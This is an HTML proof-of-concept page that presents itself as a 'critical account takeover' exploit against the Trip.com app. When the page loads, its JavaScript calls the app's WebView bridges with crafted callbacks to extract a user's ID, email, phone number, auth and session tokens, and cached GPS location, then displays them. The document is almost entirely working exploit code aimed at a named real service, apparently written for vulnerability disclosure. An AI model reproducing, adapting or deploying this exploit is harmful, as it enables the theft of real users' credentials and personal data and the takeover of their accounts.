<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trip.com - CRITICAL ACCOUNT TAKEOVER POC</title>
    <style>
        :root { --bg:#0d1117; --card:#161b22; --border:#30363d; --text:#c9d1d9; --red:#f85149; --green:#3fb950; }
        body { font-family:-apple-system,system-ui,sans-serif; background:var(--bg); color:var(--text); margin:0; padding:20px; }
        h1 { color:var(--red); text-align:center; font-size:28px; }
        .subtitle { text-align:center; color:#8b949e; margin:10px 0 30px; font-size:15px; }
        .container { max-width:1200px; margin:auto; display:flex; flex-direction:column; gap:20px; }
        .card { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:20px; }
        .card-header { display:flex; justify-content:space-between; align-items:center; font-weight:600; border-bottom:1px solid var(--border); padding-bottom:12px; }
        .status { padding:4px 12px; border-radius:20px; font-size:12px; font-weight:bold; }
        .vulnerable { background:var(--red); color:white; }
        .data-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(300px,1fr)); gap:12px; }
        .data-item { background:#000; border:1px solid var(--border); border-left:5px solid var(--red); padding:12px; border-radius:6px; }
        .data-label { font-size:11px; color:#8b949e; text-transform:uppercase; }
        .data-value { font-family:monospace; font-size:14px; word-break:break-all; color:#fff; }
        .console { background:#010409; padding:12px; font-family:monospace; font-size:12px; max-height:340px; overflow-y:auto; border:1px solid var(--border); border-radius:6px; }
    </style>
</head>
<body>
    <h1>TRIP.COM - CRITICAL ACCOUNT TAKEOVER</h1>
    <p class="subtitle">Real PII + Auth/Token/SAuth Leak via DeepLink (H5UserPlugin + IBUStorageV2Plugin)</p>

    <div class="container">
        <div class="card">
            <div class="card-header">Leaked Sensitive Data (PII + Tokens) <span id="data-status" class="status">Waiting for leak...</span></div>
            <div class="data-grid" id="data"></div>
        </div>

        <div class="card">
            <div class="card-header">Live Execution Log</div>
            <div class="console" id="console"></div>
        </div>
    </div>

    <script>
        const consoleEl = document.getElementById("console");
        const dataEl = document.getElementById("data");
        let hasLeak = false;

        function log(msg, type="info") {
            const div = document.createElement("div");
            const color = type==="success"?"#3fb950":type==="error"?"#f85149":"#c9d1d9";
            div.innerHTML = `[${new Date().toISOString().slice(11,19)}] <span style="color:${color}">${msg}</span>`;
            consoleEl.appendChild(div);
            consoleEl.scrollTop = consoleEl.scrollHeight;
        }

        function render(label, value) {
            if (!hasLeak) { dataEl.innerHTML = ""; hasLeak = true; }
            if (document.getElementById("d-"+label)) return;
            const div = document.createElement("div"); div.className = "data-item"; div.id = "d-"+label;
            const val = typeof value === "object" ? JSON.stringify(value,null,2) : (value || "NULL");
            div.innerHTML = `<div class="data-label">${label}</div><div class="data-value">${val}</div>`;
            dataEl.appendChild(div);
            document.getElementById("data-status").innerText = "DATA LEAKED! (CRITICAL)";
            document.getElementById("data-status").classList.add("vulnerable");
        }

        // ── THE ONLY CALLBACK THAT MATTERS (ax0.b → __bridge_callback) ──
        window.__bridge_callback = function(base64) {
            try {
                const json = JSON.parse(atob(base64));
                const tag = json.tagname || "unknown";
                log(`Bridge callback → ${tag}`, "success");

                const data = json.param || json.value || json;
                if (data.UserID || data.Email || data.Token) {
                    render("UserID", data.UserID);
                    render("Email", data.Email);
                    render("Mobile", data.Mobile);
                    render("Auth Token", data.Auth);
                    render("Session Token", data.Token);
                    render("SAuth", data.SAuth);
                }
                if (data.value) render(`Storage: ${tag}`, data.value);
            } catch(e) { log("Callback parse failed: " + e.message, "error"); }
        };

        // ── Direct fallback (in case LoadJsHolder calls window[cb] directly) ──
        function registerDirectCallback(name) {
            window[name] = function(res) {
                log(`Direct callback ${name} fired`, "success");
                if (res && (res.UserID || res.param)) {
                    const d = res.param || res;
                    render("UserID", d.UserID);
                    render("Email", d.Email);
                    render("Token", d.Token);
                    render("SAuth", d.SAuth);
                }
            };
            return name;
        }

        async function exploit() {
            log("=== STARTING CRITICAL EXPLOIT (exact H5URLCommand format) ===", "success");

            const cb1 = registerDirectCallback("leak_user_" + Date.now());

            // 1. User_a.getUserInfo - دقیق‌ترین فرمت‌ها (plain string + callback key)
            if (window.User_a && typeof window.User_a.getUserInfo === "function") {
                const formats = [
                    cb1,                                          // plain string callback
                    JSON.stringify({callback: cb1}),
                    JSON.stringify({callbackTagName: cb1}),
                    JSON.stringify({tagname: cb1})
                ];
                for (let f of formats) {
                    try { window.User_a.getUserInfo(f); log(`getUserInfo sent: ${f.substring(0,60)}...`); } catch(e){}
                }
            }

            // 2. IBUStorageV2_a.IBUGetUserValue - با bussiness/key + callback
            if (window.IBUStorageV2_a) {
                const targets = [
                    {b:"user", k:"userInfo"}, {b:"common", k:"token"}, {b:"common", k:"uid"},
                    {b:"common", k:"vtoken"}, {b:"common", k:"auth"}
                ];
                for (let t of targets) {
                    const cb = registerDirectCallback("leak_store_" + Date.now());
                    const formats = [
                        JSON.stringify({callback: cb, bussiness: t.b, key: t.k}),
                        JSON.stringify({callbackTagName: cb, bussiness: t.b, key: t.k}),
                        JSON.stringify({callback: cb, arguments: {bussiness: t.b, key: t.k}}),
                        JSON.stringify({callbackTagName: cb, arguments: {bussiness: t.b, key: t.k}})
                    ];
                    for (let f of formats) {
                        try { window.IBUStorageV2_a.IBUGetUserValue(f); } catch(e){}
                    }
                }
            }

            // 3. Silent GPS
            setTimeout(() => {
                if (window.Locate_a && typeof window.Locate_a.getCachedLocationData === "function") {
                    try {
                        const loc = window.Locate_a.getCachedLocationData();
                        if (loc) render("GPS Location", `Lat: ${loc.lat || loc.latitude} | Lng: ${loc.lng || loc.longitude}`);
                    } catch(e){}
                }
            }, 1200);
        }

        window.onload = () => {
            log("Scanning bridges + starting exploit...");
            setTimeout(exploit, 800);
        };
    </script>
</body>
</html>
